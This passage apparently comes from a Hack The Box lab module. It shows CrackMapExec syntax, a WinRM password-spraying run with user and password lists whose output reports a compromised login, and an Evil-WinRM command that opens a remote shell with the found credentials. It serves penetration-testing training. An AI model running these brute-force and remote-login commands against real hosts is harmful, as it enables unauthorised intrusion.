
#### CrackMapExec Usage

The general format for using CrackMapExec is as follows:

  CrackMapExec Usage

```shell-session
Tachipy@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

  CrackMapExec Usage

```shell-session
Tachipy@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```
#### Evil-WinRM Usage

  Evil-WinRM Usage

```shell-session
Tachipy@htb[/htb]$ evil-winrm -i 10.129.100.246 -u john -p november
```